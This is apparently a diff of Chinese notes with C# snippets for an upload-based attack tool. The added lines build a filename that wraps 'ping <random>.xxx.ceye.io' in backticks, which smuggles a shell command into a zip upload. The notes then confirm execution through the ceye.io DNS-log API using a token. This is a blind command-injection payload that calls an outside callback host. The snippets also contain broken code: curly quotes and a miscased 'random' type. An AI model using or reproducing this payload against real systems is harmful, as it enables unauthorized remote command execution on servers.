@@ -266,6 +266,15 @@ Content-Type: application/zip
      String filepath1 = randomNumber + "." + filePath;  叠加后的数据
    filepath1 = textBox5.Text; 传给一个控件
   request.Headers.Add("Token", token);加载读到的token
+
+PIng写法:
+空格："ping "
+random random = new Random();
+int randomNumber = random.Next(1, 100);
+string filePath = “xxx.ceye.io”;
+String filepath1 = randomNumber + “.” + filePath;
+ String filepath2 = "`" +"ping "+ filepath1 + "`"+".zip";
+
   验证的话， 还是采用http://api.ceye.io/v1/records?token=去验证
   
    http://api.ceye.io/v1/records?token=+"token信息";
